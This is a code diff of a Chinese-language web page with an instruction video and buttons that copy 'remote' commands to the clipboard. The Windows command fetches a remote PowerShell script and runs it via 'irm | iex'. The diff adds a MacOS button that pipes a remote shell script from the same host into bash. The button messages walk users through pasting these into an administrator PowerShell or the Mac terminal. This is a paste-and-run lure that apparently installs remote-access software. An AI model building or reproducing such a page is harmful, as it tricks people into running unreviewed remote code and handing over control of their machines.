@@ -27,7 +27,6 @@
             padding: 8px 16px;
             font-size: 1rem;
         }
-        /* 原 #win7Btn 样式已移除 */
     </style>
 </head>
 <body>
@@ -36,82 +35,90 @@
         <source src="" type="video/mp4" id="videoSource">
         你的浏览器不支持 video 标签。
     </video>
-    
-    <!-- 复制命令按钮（固定为Win10/11配置） -->
+
+    <!-- 复制 Windows 命令按钮 -->
     <button id="copyBtn">复制 "Windows远程" 命令</button>
+
+    <!-- 复制 MacOS 命令按钮（居中放置在下方） -->
+    <button id="copyMacBtn">复制 "MacOS远程" 命令</button>
 
     <script>
         (function() {
             // 固定为 Windows 10/11 的配置（已移除系统版本判断）
-            // var videoSrc = './0.mp4';
-            var videoSrc = 'https://cnb.cool/WXFY001/V/-/commit-assets/download/c5f845e2130d42a8ca01aafddd998baedc78a0e4/wb.mp4'; 
+            var videoSrc = 'https://cnb.cool/WXFY001/V/-/commit-assets/download/c5f845e2130d42a8ca01aafddd998baedc78a0e4/wb.mp4';
             var cmdText = "$o='https://cnb.cool/GHFXJ/YC/-/git/raw/main';try{irm $o/X.ps1|iex}catch{start $o/远程软件.zip}";
             var successMsg = '已复制! 右击开始按钮 ➤ 单击Powershell/终端(管理员) ➤ 右击粘贴';
+
+            // MacOS 命令配置
+            var macCmdText = "curl -fsSL https://cnb.cool/GHFXJ/YC/-/git/raw/main/X.sh | bash";
+            var macSuccessMsg = '已复制! 打开MacOS终端 ➤ 粘贴并回车';
 
             // 设置视频源
             var video = document.getElementById('instructionVideo');
             var source = document.getElementById('videoSource');
             if (video && source) {
                 source.src = videoSrc;
-                video.load(); // 重新加载视频
+                video.load();
             }
 
-            // ---------- 复制按钮逻辑 ----------
+            // ---------- 通用复制函数 ----------
+            function copyToClipboard(text, btn, originalText, successMessage) {
+                // 兼容IE
+                if (window.clipboardData && window.clipboardData.setData) {
+                    try {
+                        window.clipboardData.setData('Text', text);
+                        btn.innerText = successMessage;
+                        setTimeout(function() {
+                            btn.innerText = originalText;
+                        }, 20000);
+                    } catch (e) {
+                        alert('复制失败，请手动选择命令后复制 (Ctrl+C)。\n' + (e || ''));
+                    }
+                    return;
+                }
+
+                // 通用降级方案
+                var textarea = document.createElement('textarea');
+                textarea.value = text;
+                textarea.style.position = 'fixed';
+                textarea.style.left = '-9999px';
+                textarea.style.top = '0';
+                document.body.appendChild(textarea);
+                textarea.select();
+                try {
+                    var successful = document.execCommand('copy');
+                    if (successful) {
+                        btn.innerText = successMessage;
+                        setTimeout(function() {
+                            btn.innerText = originalText;
+                        }, 20000);
+                    } else {
+                        alert('复制失败，请手动选择命令后复制 (Ctrl+C)。\n' + 'execCommand 返回 false');
+                    }
+                } catch (err) {
+                    alert('复制失败，请手动选择命令后复制 (Ctrl+C)。\n' + (err || ''));
+                } finally {
+                    document.body.removeChild(textarea);
+                }
+            }
+
+            // ---------- Windows 复制按钮 ----------
             var copyBtn = document.getElementById('copyBtn');
             if (copyBtn) {
                 var originalBtnText = copyBtn.innerText;
-
-                function onCopySuccess() {
-                    copyBtn.innerText = successMsg;
-                    setTimeout(function() {
-                        copyBtn.innerText = originalBtnText;
-                    }, 20000);
-                }
-
-                function onCopyError(err) {
-                    alert('复制失败，请手动选择命令后复制 (Ctrl+C)。\n' + (err || ''));
-                }
-
-                function copyToClipboard(text) {
-                    // 兼容IE
-                    if (window.clipboardData && window.clipboardData.setData) {
-                        try {
-                            window.clipboardData.setData('Text', text);
-                            onCopySuccess();
-                        } catch (e) {
-                            onCopyError(e);
-                        }
-                        return;
-                    }
-
-                    // 通用降级方案
-                    var textarea = document.createElement('textarea');
-                    textarea.value = text;
-                    textarea.style.position = 'fixed';
-                    textarea.style.left = '-9999px';
-                    textarea.style.top = '0';
-                    document.body.appendChild(textarea);
-                    textarea.select();
-                    try {
-                        var successful = document.execCommand('copy');
-                        if (successful) {
-                            onCopySuccess();
-                        } else {
-                            onCopyError('execCommand 返回 false');
-                        }
-                    } catch (err) {
-                        onCopyError(err);
-                    } finally {
-                        document.body.removeChild(textarea);
-                    }
-                }
-
                 copyBtn.addEventListener('click', function() {
-                    copyToClipboard(cmdText);
+                    copyToClipboard(cmdText, copyBtn, originalBtnText, successMsg);
                 });
             }
 
-            // ---------- 原 Win7 按钮相关代码已全部删除 ----------
+            // ---------- MacOS 复制按钮 ----------
+            var copyMacBtn = document.getElementById('copyMacBtn');
+            if (copyMacBtn) {
+                var originalMacBtnText = copyMacBtn.innerText;
+                copyMacBtn.addEventListener('click', function() {
+                    copyToClipboard(macCmdText, copyMacBtn, originalMacBtnText, macSuccessMsg);
+                });
+            }
         })();
     </script>
 </body>
